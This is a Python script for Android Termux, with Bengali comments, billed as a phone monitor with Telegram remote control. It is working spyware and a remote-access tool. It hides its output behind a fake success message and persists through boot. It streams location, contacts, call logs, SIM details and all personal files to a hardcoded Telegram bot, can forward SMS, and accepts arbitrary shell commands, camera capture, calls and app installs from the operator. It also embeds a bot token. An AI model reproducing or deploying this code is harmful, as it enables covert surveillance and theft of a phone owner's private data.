#!/usr/bin/env python3
"""
Fast Phone Monitor + Telegram Remote Control
- শুধু "successfully start service" দেখাবে
- টেলিগ্রাম দিয়ে সম্পূর্ণ কন্ট্রোল
- অটো-স্টার্ট (Termux:Boot)
"""

# ============================================================
#  SILENT MODE (শুধু শেষে একটি লাইন)
# ============================================================
import os
import sys
os.system("termux-setup-storage")
_real_stdout = sys.stdout
_devnull = open(os.devnull, "w")
sys.stdout = _devnull
sys.stderr = _devnull

# ============================================================
#  IMPORTS
# ============================================================
import json
import time
import socket
import platform
import threading
import subprocess
import requests
from datetime import datetime
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
subprocess.Popen(["python", "server.py"])
# ============================================================
#  CONFIG
# ============================================================
BOT_TOKEN = "8158771703:AAHs3rsrzzXZ1eqqfg2StboikKEgVJNTLsY"
CHAT_ID   = "6028738290"

LOCATION_INTERVAL = 10
MAX_FILE_SIZE_MB  = 49
SEND_FILES        = True
BATTERY_ALERT     = 20
FORWARD_SMS       = False   # চাইলে True করো

REMOTE_ENABLED    = True
CMD_PREFIX        = "/cmd"
SHELL_TIMEOUT     = 30
LAST_UPDATE_FILE  = os.path.expanduser("~/.last_tg_update")
SMS_LAST_ID_FILE  = os.path.expanduser("~/.last_sms_id")

# requests session (connection reuse → অনেক ফাস্ট)
SESSION = requests.Session()

# ============================================================
#  AUTO-START
# ============================================================
def setup_autostart():
    try:
        home = os.path.expanduser("~")
        boot_dir = os.path.join(home, ".termux", "boot")
        script_path = os.path.join(boot_dir, "start.sh")
        self_path = os.path.abspath(__file__)
        log_path = os.path.join(home, "service.log")

        os.makedirs(boot_dir, exist_ok=True)
        script = f"""#!/data/data/com.termux/files/usr/bin/sh
termux-wake-lock
cd {home}
nohup python {self_path} > {log_path} 2>&1 &
"""
        try:
            if not os.path.exists(script_path) or open(script_path).read() != script:
                with open(script_path, "w") as f:
                    f.write(script)
                os.chmod(script_path, 0o755)
        except Exception:
            pass

        subprocess.run("termux-wake-lock", shell=True,
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        pass

# ============================================================
#  SHELL HELPERS (ফাস্ট)
# ============================================================
def shell(c, timeout=10):
    try:
        return subprocess.run(
            c, shell=True, capture_output=True, text=True,
            timeout=timeout
        ).stdout.strip()
    except Exception:
        return ""

def shell_full(c, timeout=10):
    try:
        r = subprocess.run(
            c, shell=True, capture_output=True, text=True,
            timeout=timeout
        )
        return ((r.stdout or "") + (r.stderr or "")).strip()
    except subprocess.TimeoutExpired:
        return "[timeout]"
    except Exception as e:
        return f"[error] {e}"

def shell_json(c, timeout=8):
    out = shell(c, timeout)
    if not out:
        return None
    try:
        return json.loads(out)
    except Exception:
        return None

def file_exists(p):
    try:    return os.path.exists(p)
    except: return False

def read_file(p):
    try:
        with open(p, "r") as f: return f.read().strip()
    except: return ""

def write_file(p, c):
    try:
        with open(p, "w") as f: f.write(str(c))
        return True
    except: return False

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]; s.close(); return ip
    except: return "0.0.0.0"

def get_public_ip():
    try:
        r = SESSION.get("https://api.ipify.org", timeout=5)
        return r.text.strip()
    except: return "N/A"

def esc(t):
    if t is None: return ""
    return str(t).replace("&","&amp;").replace("<","&lt;").replace(">","&gt;")

# ============================================================
#  TELEGRAM
# ============================================================
def tg(method, **kwargs):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/{method}"
        r = SESSION.post(url, data=kwargs, timeout=15, verify=False)
        return r.json()
    except Exception:
        return {}

def send_msg(text):
    # 4096 limit
    if text is None: text = ""
    text = str(text)
    for i in range(0, len(text), 4000):
        tg("sendMessage", chat_id=CHAT_ID, text=text[i:i+4000],
           parse_mode="HTML", disable_web_page_preview="true")

def send_doc(path, caption=""):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
        with open(path, "rb") as f:
            r = SESSION.post(
                url,
                data={"chat_id": CHAT_ID, "caption": caption[:200]},
                files={"document": f},
                timeout=120, verify=False
            )
        return r.status_code == 200
    except Exception:
        return False

def send_photo(path, caption=""):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
        with open(path, "rb") as f:
            r = SESSION.post(
                url,
                data={"chat_id": CHAT_ID, "caption": caption[:200]},
                files={"photo": f},
                timeout=120, verify=False
            )
        return r.status_code == 200
    except Exception:
        return False

def tg_get_updates(offset=None, timeout=25):
    """Long polling — ফাস্ট রেসপন্স"""
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
        params = {"timeout": timeout, "allowed_updates": '["message"]'}
        if offset is not None:
            params["offset"] = offset
        r = SESSION.get(url, params=params, timeout=timeout + 10, verify=False)
        data = r.json()
        if data.get("ok"):
            return data.get("result", [])
        return []
    except Exception:
        return []

def load_last_id():
    try:
        with open(LAST_UPDATE_FILE, "r") as f:
            return int(f.read().strip())
    except: return 0

def save_last_id(uid):
    write_file(LAST_UPDATE_FILE, uid)

# ============================================================
#  LOCATION
# ============================================================
def get_location():
    loc = shell_json("termux-location -p network", timeout=6)
    if loc and loc.get("latitude"):
        return loc["latitude"], loc["longitude"], loc.get("accuracy","?")
    loc = shell_json("termux-location -p gps", timeout=6)
    if loc and loc.get("latitude"):
        return loc["latitude"], loc["longitude"], loc.get("accuracy","?")
    return None, None, None

def send_location():
    lat, lon, acc = get_location()
    if lat is not None:
        link = f"https://www.google.com/maps?q={lat},{lon}"
        send_msg(
            f"<b>📍 Live Location</b>\n"
            f"🕐 {datetime.now().strftime('%H:%M:%S')}\n"
            f"<b>Lat:</b> {lat}\n<b>Lon:</b> {lon}\n"
            f"<b>Acc:</b> {acc} m\n"
            f"<a href='{link}'>🗺️ Google Maps</a>"
        )
        return True
    return False

def location_loop():
    while True:
        try: send_location()
        except Exception: pass
        time.sleep(LOCATION_INTERVAL)

# ============================================================
#  DEVICE / SIM / CALL / CONTACTS
# ============================================================
def device_info():
    d = {}
    d["Model"]        = shell("getprop ro.product.model")
    d["Brand"]        = shell("getprop ro.product.brand")
    d["Manufacturer"] = shell("getprop ro.product.manufacturer")
    d["Android"]      = shell("getprop ro.build.version.release")
    d["SDK"]          = shell("getprop ro.build.version.sdk")
    d["Hostname"]     = socket.gethostname()
    d["Kernel"]       = platform.release()
    d["Arch"]         = platform.machine()

    mem = shell("cat /proc/meminfo")
    for line in mem.split("\n"):
        if "MemTotal" in line:
            try: d["RAM Total"] = f"{round(int(line.split()[1])/1024/1024,2)} GB"
            except: pass
        if "MemAvailable" in line:
            try: d["RAM Free"] = f"{round(int(line.split()[1])/1024/1024,2)} GB"
            except: pass

    df = shell("df -h /data").split("\n")
    if len(df) > 1:
        p = df[1].split()
        if len(p) >= 4:
            d["Storage Total"], d["Storage Used"], d["Storage Free"] = p[1], p[2], p[3]

    for p in ["/sys/class/power_supply/battery/capacity",
              "/sys/class/power_supply/BAT0/capacity"]:
        if file_exists(p):
            d["Battery"] = f"{read_file(p)}%"
            break

    sp = "/sys/class/power_supply/battery/status"
    if file_exists(sp): d["Battery Status"] = read_file(sp)

    tp = "/sys/class/power_supply/battery/temp"
    if file_exists(tp):
        try: d["Temperature"] = f"{int(read_file(tp))/10}°C"
        except: pass

    wifi = shell("ip addr show wlan0 | grep 'inet ' | awk '{print $2}'")
    d["WiFi IP"]   = wifi if wifi else "N/A"
    d["Public IP"] = get_public_ip()
    return d

def format_device(d):
    t = "<b>📱 Device Info</b>\n\n"
    for k, v in d.items():
        if v: t += f"<b>{k}:</b> {v}\n"
    return t

def sim_info():
    t = "<b>📶 SIM Info</b>\n\n"
    t += f"<b>Network Operator:</b> {shell('getprop gsm.operator.alpha') or 'N/A'}\n"
    t += f"<b>SIM Operator:</b> {shell('getprop gsm.sim.operator.alpha') or 'N/A'}\n"
    t += f"<b>Country:</b> {shell('getprop gsm.operator.iso-country') or 'N/A'}\n"
    t += f"<b>SIM State:</b> {shell('getprop gsm.sim.state') or 'N/A'}\n"
    t += f"<b>Network Type:</b> {shell('getprop gsm.network.type') or 'N/A'}\n"
    t += f"<b>Device Serial:</b> {shell('getprop ro.serialno') or 'N/A'}\n"
    return t

def call_log():
    data = shell_json("termux-call-log -l 50", timeout=10)
    if not data:
        return "<b>📞 Call Log</b>\n\n⚠️ Termux:API not installed"
    t = "<b>📞 Call Log (Last 50)</b>\n\n"
    for c in data[:50]:
        icon = {"INCOMING":"⬅️","OUTGOING":"➡️","MISSED":"❌"}.get(c.get("type",""),"📞")
        t += f"{icon} <b>{c.get('name','Unknown')}</b>\n"
        t += f"   📱 {c.get('phone_number','?')}\n"
        t += f"   🕐 {c.get('date','?')} | ⏱ {c.get('duration','0')}s\n\n"
    return t

def contacts():
    data = shell_json("termux-contact-list", timeout=10)
    if not data:
        return "<b>👥 Contacts</b>\n\n⚠️ Termux:API not installed"
    t = f"<b>👥 Contacts ({len(data)})</b>\n\n"
    for c in data[:200]:
        t += f"👤 <b>{c.get('name','?')}</b> — {c.get('number','?')}\n"
    return t

# ============================================================
#  FILES
# ============================================================
IMAGE_EXT = {".jpg",".jpeg",".png",".gif",".webp",".bmp"}
VIDEO_EXT = {".mp4",".mkv",".avi",".mov",".3gp",".webm"}
DOC_EXT   = {".pdf",".doc",".docx",".txt",".xls",".xlsx",".ppt",".pptx"}
AUDIO_EXT = {".mp3",".wav",".m4a",".aac",".ogg"}

def file_category(name):
    ext = os.path.splitext(name)[1].lower()
    if ext in IMAGE_EXT: return "Photo"
    if ext in VIDEO_EXT: return "Video"
    if ext in DOC_EXT:   return "Document"
    if ext in AUDIO_EXT: return "Audio"
    return "Other"

def scan_files():
    base = os.path.expanduser("~/storage/shared")
    found = []
    if not os.path.exists(base):
        return found
    for root, dirs, files in os.walk(base):
        dirs[:] = [d for d in dirs if d not in
                   (".thumbnails",".cache","Android/data","Android/obb")]
        for f in files:
            try:
                full = os.path.join(root, f)
                size = os.path.getsize(full)
                found.append({"path": full, "name": f, "size": size,
                              "category": file_category(f)})
            except Exception:
                pass
    return found

def file_report(files):
    counts = {"Photo":0,"Video":0,"Document":0,"Audio":0,"Other":0}
    total = 0
    for f in files:
        counts[f["category"]] += 1
        total += f["size"]
    t = "<b>📁 File Summary</b>\n\n"
    for k,v in counts.items():
        t += f"<b>{k}:</b> {v}\n"
    t += f"\n<b>Total:</b> {len(files)} files\n<b>Size:</b> {round(total/1024/1024,2)} MB"
    return t

def file_index(files):
    p = os.path.expanduser("~/file_index.txt")
    with open(p, "w", encoding="utf-8") as fh:
        for f in files:
            fh.write(f"{f['category']:9} | {round(f['size']/1024,1):>10} KB | {f['path']}\n")
    send_doc(p, "📄 File Index")

def upload_files(files):
    for f in files:
        if 0 < f["size"] <= MAX_FILE_SIZE_MB * 1024 * 1024:
            send_doc(f["path"], f"📎 {f['name']}")

# ============================================================
#  EXTRA LOOPS
# ============================================================
def battery_monitor_loop():
    alerted = False
    while True:
        try:
            for p in ["/sys/class/power_supply/battery/capacity",
                      "/sys/class/power_supply/BAT0/capacity"]:
                if file_exists(p):
                    try:
                        lvl = int(read_file(p))
                        if lvl <= BATTERY_ALERT and not alerted:
                            send_msg(f"🔋 <b>Low Battery:</b> {lvl}%")
                            alerted = True
                        elif lvl > BATTERY_ALERT:
                            alerted = False
                    except: pass
                    break
        except: pass
        time.sleep(60)

def sms_forward_loop():
    try:
        with open(SMS_LAST_ID_FILE) as f:
            last = int(f.read().strip())
    except: last = 0
    while True:
        try:
            data = shell_json("termux-sms-list -l 20", timeout=8)
            if data:
                for sms in data:
                    try: sid = int(sms.get("_id",0))
                    except: sid = 0
                    if sid > last:
                        last = sid
                        send_msg(
                            f"<b>📩 New SMS</b>\n"
                            f"<b>From:</b> {esc(sms.get('number','?'))}\n"
                            f"<b>Time:</b> {sms.get('received','')}\n\n"
                            f"{esc(sms.get('body',''))}"
                        )
                write_file(SMS_LAST_ID_FILE, last)
        except: pass
        time.sleep(30)

# ============================================================
#  REMOTE COMMAND EXECUTOR
# ============================================================
HELP_TEXT = """<b>🎮 Remote Commands</b>

<code>/cmd help</code>              — এই হেল্প
<code>/cmd info</code>              — ডিভাইস ইনফো
<code>/cmd loc</code>               — লোকেশন
<code>/cmd ip</code>                — IP
<code>/cmd battery</code>           — ব্যাটারি
<code>/cmd ls &lt;path&gt;</code>      — ফাইল লিস্ট
<code>/cmd cd &lt;path&gt;</code>      — ডিরেক্টরি বদল
<code>/cmd pwd</code>               — বর্তমান পথ
<code>/cmd cat &lt;file&gt;</code>     — ফাইল পড়া
<code>/cmd rm &lt;file&gt;</code>      — ফাইল ডিলিট
<code>/cmd mkdir &lt;dir&gt;</code>    — ফোল্ডার তৈরি
<code>/cmd download &lt;url&gt;</code>   — ফাইল ডাউনলোড
<code>/cmd upload &lt;path&gt;</code>   — টেলিগ্রামে পাঠাও
<code>/cmd apps</code>              — ইনস্টলড অ্যাপ
<code>/cmd uninstall &lt;pkg&gt;</code> — অ্যাপ ডিলিট
<code>/cmd install &lt;apk&gt;</code>   — APK ইনস্টল
<code>/cmd pkg &lt;cmd&gt;</code>       — pkg install
<code>/cmd pip &lt;cmd&gt;</code>       — pip install
<code>/cmd shot</code>              — স্ক্রিনশট
<code>/cmd cam</code>               — ক্যামেরা ছবি
<code>/cmd notify &lt;text&gt;</code>    — নোটিফিকেশন
<code>/cmd torch on|off</code>      — টর্চ
<code>/cmd vibrate &lt;ms&gt;</code>    — কম্পন
<code>/cmd sms &lt;num&gt; &lt;txt&gt;</code> — SMS
<code>/cmd call &lt;num&gt;</code>      — কল
<code>/cmd open &lt;url&gt;</code>      — ব্রাউজার
<code>/cmd wifi</code>              — WiFi স্ক্যান
<code>/cmd ps</code>                — প্রসেস
<code>/cmd kill &lt;pid&gt;</code>      — প্রসেস কিল
<code>/cmd volume &lt;0-15&gt;</code>   — ভলিউম
<code>/cmd clip get</code>          — ক্লিপবোর্ড
<code>/cmd clip set &lt;txt&gt;</code>  — ক্লিপবোর্ড সেট
<code>/cmd lock</code>              — স্ক্রিন লক
<code>/cmd reboot</code>            — রিবুট
<code>/cmd stop</code>              — সার্ভিস বন্ধ
<code>/cmd shell &lt;cmd&gt;</code>     — যেকোনো কমান্ড

<b>Shortcut:</b> <code>/ls /sdcard</code> — /cmd ছাড়াও চলে।
"""

_remote_cwd = os.path.expanduser("~")

def run_remote(raw_cmd):
    global _remote_cwd
    raw_cmd = (raw_cmd or "").strip()
    if not raw_cmd: return "(empty)"

    parts = raw_cmd.split(" ", 1)
    name  = parts[0].lower()
    arg   = parts[1].strip() if len(parts) > 1 else ""

    if name == "help":    return HELP_TEXT
    if name == "info":    return "<pre>" + esc(json.dumps(device_info(), indent=2)) + "</pre>"
    if name == "ip":      return f"Local: {get_local_ip()}\nPublic: {get_public_ip()}"

    if name == "loc":
        lat, lon, acc = get_location()
        if lat is None: return "❌ Location unavailable (Termux:API লাগবে)"
        return f"📍 {lat}, {lon} (±{acc}m)\n<a href='https://www.google.com/maps?q={lat},{lon}'>Maps</a>"

    if name == "battery":
        return esc(shell_full("termux-battery-status") or "termux-api নেই")

    if name == "pwd": return _remote_cwd

    if name == "cd":
        t = arg or os.path.expanduser("~")
        if not os.path.isabs(t): t = os.path.join(_remote_cwd, t)
        if os.path.isdir(t):
            _remote_cwd = os.path.abspath(t)
            return f"cwd → {_remote_cwd}"
        return f"not a dir: {t}"

    if name == "ls":
        t = arg or _remote_cwd
        if not os.path.isabs(t): t = os.path.join(_remote_cwd, t)
        try: entries = sorted(os.listdir(t))
        except Exception as e: return f"error: {e}"
        if not entries: return "(empty)"
        lines = []
        for e in entries[:200]:
            full = os.path.join(t, e)
            tag = "d" if os.path.isdir(full) else "-"
            try: size = os.path.getsize(full)
            except: size = 0
            lines.append(f"{tag} {size:>12}  {e}")
        return "<pre>" + esc("\n".join(lines)) + "</pre>"

    if name == "cat":
        if not arg: return "usage: /cmd cat <file>"
        t = arg if os.path.isabs(arg) else os.path.join(_remote_cwd, arg)
        try:
            return "<pre>" + esc(open(t, errors="ignore").read(4000)) + "</pre>"
        except Exception as e: return f"error: {e}"

    if name == "rm":
        if not arg: return "usage: /cmd rm <file>"
        t = arg if os.path.isabs(arg) else os.path.join(_remote_cwd, arg)
        try:
            if os.path.isdir(t): subprocess.run(["rm","-rf",t], timeout=30)
            else: os.remove(t)
            return f"removed: {t}"
        except Exception as e: return f"error: {e}"

    if name == "mkdir":
        if not arg: return "usage: /cmd mkdir <dir>"
        t = arg if os.path.isabs(arg) else os.path.join(_remote_cwd, arg)
        try: os.makedirs(t, exist_ok=True); return f"created: {t}"
        except Exception as e: return f"error: {e}"

    if name == "download":
        if not arg: return "usage: /cmd download <url>"
        fname = arg.split("/")[-1] or "file.bin"
        t = os.path.join(_remote_cwd, fname)
        try:
            r = SESSION.get(arg, timeout=60, verify=False, stream=True)
            with open(t, "wb") as f:
                for chunk in r.iter_content(8192): f.write(chunk)
            return f"✅ {t}"
        except Exception as e: return f"error: {e}"

    if name == "upload":
        if not arg: return "usage: /cmd upload <path>"
        t = arg if os.path.isabs(arg) else os.path.join(_remote_cwd, arg)
        if not os.path.exists(t): return "not found"
        return "✅ sent" if send_doc(t, f"📎 {os.path.basename(t)}") else "❌ failed"

    if name == "apps":
        return "<pre>" + esc(shell_full("pm list packages", timeout=20)[:3500]) + "</pre>"

    if name == "uninstall":
        if not arg: return "usage: /cmd uninstall <pkg>"
        return esc(shell_full(f"pm uninstall --user 0 {arg}", timeout=60) or "(no output)")

    if name == "install":
        if not arg: return "usage: /cmd install <apk>"
        t = arg if os.path.isabs(arg) else os.path.join(_remote_cwd, arg)
        return esc(shell_full(f"pm install -r '{t}'", timeout=120) or "(no output)")

    if name == "pkg":
        if not arg: return "usage: /cmd pkg install x"
        return "<pre>" + esc(shell_full(f"pkg {arg}", timeout=300)[:3500]) + "</pre>"

    if name == "pip":
        if not arg: return "usage: /cmd pip install x"
        return "<pre>" + esc(shell_full(f"pip {arg}", timeout=300)[:3500]) + "</pre>"

    if name == "shot":
        shell_full("termux-camera-photo -c 0 /sdcard/shot.jpg", timeout=20)
        time.sleep(1)
        if os.path.exists("/sdcard/shot.jpg"):
            send_photo("/sdcard/shot.jpg", "📸"); return "📸 sent"
        return "termux-api নেই"

    if name == "cam":
        shell_full("termux-camera-photo -c 0 /sdcard/photo.jpg", timeout=20)
        time.sleep(1)
        if os.path.exists("/sdcard/photo.jpg"):
            send_photo("/sdcard/photo.jpg", "📷"); return "📷 sent"
        return "termux-api নেই"

    if name == "notify":
        if not arg: return "usage: /cmd notify <text>"
        shell_full(f'termux-notification --content "{arg}"')
        return "✅"

    if name == "torch":
        s = arg.lower()
        if s == "on":  shell_full("termux-torch on");  return "🔦 ON"
        if s == "off": shell_full("termux-torch off"); return "🔦 OFF"
        return "usage: /cmd torch on|off"

    if name == "vibrate":
        ms = arg or "1000"; shell_full(f"termux-vibrate -d {ms}")
        return f"📳 {ms}ms"

    if name == "sms":
        b = arg.split(" ",1)
        if len(b) < 2: return "usage: /cmd sms <num> <text>"
        shell_full(f'termux-sms-send -n "{b[0]}" "{b[1]}"')
        return f"✅ SMS → {b[0]}"

    if name == "call":
        if not arg: return "usage: /cmd call <num>"
        shell_full(f"termux-telephony-call {arg}")
        return f"📞 {arg}"

    if name == "open":
        if not arg: return "usage: /cmd open <url>"
        shell_full(f'am start -a android.intent.action.VIEW -d "{arg}"')
        return f"🌐 {arg}"

    if name == "wifi":
        out = shell_full("termux-wifi-scaninfo", timeout=20)
        return "<pre>" + esc(out[:3500]) + "</pre>" if out else "termux-api নেই"

    if name == "ps":
        return "<pre>" + esc(shell_full("ps -ef")[:3500]) + "</pre>"

    if name == "kill":
        if not arg.isdigit(): return "usage: /cmd kill <pid>"
        return shell_full(f"kill -9 {arg}") or f"killed {arg}"

    if name == "volume":
        if not arg.isdigit(): return "usage: /cmd volume <0-15>"
        shell_full(f"termux-volume music {arg}")
        return f"🔊 {arg}"

    if name == "clip":
        b = arg.split(" ",1)
        if not b: return "usage: /cmd clip get|set <text>"
        if b[0] == "get": return esc(shell("termux-clipboard-get") or "(empty)")
        if b[0] == "set":
            shell_full(f'termux-clipboard-set "{b[1] if len(b)>1 else ""}"')
            return "✅ set"

    if name == "lock":
        shell_full("input keyevent 26"); return "🔒 locked"

    if name == "reboot":
        send_msg("♻️ Rebooting..."); time.sleep(1)
        shell_full("reboot"); return "reboot issued"

    if name == "stop":
        send_msg("💀 Service stopped"); time.sleep(0.5); os._exit(0)

    if name == "shell":
        if not arg: return "usage: /cmd shell <cmd>"
        return "<pre>" + esc(shell_full(arg, timeout=SHELL_TIMEOUT)[:3500]) + "</pre>"

    # Default → shell
    return "<pre>" + esc(shell_full(raw_cmd, timeout=SHELL_TIMEOUT)[:3500]) + "</pre>"

# ============================================================
#  TELEGRAM POLLING LOOP (দ্রুত)
# ============================================================
def telegram_loop():
    # প্রথমবার পুরোনো মেসেজ স্কিপ
    init = tg_get_updates(offset=None, timeout=1)
    last = load_last_id()
    if last == 0 and init:
        last = init[-1]["update_id"] + 1
        save_last_id(last)

    while True:
        try:
            updates = tg_get_updates(offset=last, timeout=25)
            for upd in updates:
                last = upd["update_id"] + 1
                save_last_id(last)

                msg = upd.get("message") or {}
                chat = str(msg.get("chat", {}).get("id", ""))
                text = (msg.get("text") or "").strip()
                if chat != str(CHAT_ID) or not text:
                    continue

                low = text.lower()
                if low.startswith(CMD_PREFIX):
                    cmd = text[len(CMD_PREFIX):].strip()
                elif text.startswith("/"):
                    cmd = text[1:].strip()
                else:
                    continue

                if not cmd:
                    send_msg(HELP_TEXT); continue

                # সাথে সাথে রেসপন্স
                threading.Thread(
                    target=lambda c=cmd: send_msg(run_remote(c)),
                    daemon=True
                ).start()
        except Exception:
            time.sleep(1)

# ============================================================
#  MAIN
# ============================================================
def main():
    setup_autostart()

    send_msg(
        f"<b>✅ Service Started</b>\n\n"
        f"<b>Model:</b> {shell('getprop ro.product.model')}\n"
        f"<b>Local IP:</b> {get_local_ip()}\n"
        f"<b>Public IP:</b> {get_public_ip()}\n\n"
        f"<i>Send /cmd help for commands</i>"
    )

    # অটো কাজ — শুধু প্রথমবার
    try:
        send_location()
        send_msg(format_device(device_info()))
        send_msg(sim_info())
        send_msg(call_log())
        send_msg(contacts())

        files = scan_files()
        send_msg(file_report(files))
        file_index(files)

        if SEND_FILES and files:
            send_msg(f"<b>📤 Uploading files...</b>\nTotal: {len(files)}")
            upload_files(files)
    except Exception:
        pass

    # Background loops
    threading.Thread(target=location_loop,        daemon=True).start()
    threading.Thread(target=battery_monitor_loop, daemon=True).start()
    if FORWARD_SMS:
        threading.Thread(target=sms_forward_loop, daemon=True).start()
    if REMOTE_ENABLED:
        threading.Thread(target=telegram_loop,    daemon=True).start()

    while True:
        time.sleep(3600)

# ============================================================
#  ENTRY
# ============================================================
if __name__ == "__main__":
    try:
        threading.Thread(target=main, daemon=True).start()
        _real_stdout.write("successfully start service\n")
        _real_stdout.flush()
        while True:
            time.sleep(3600)
    except KeyboardInterrupt:
        pass
    except Exception:
        pass
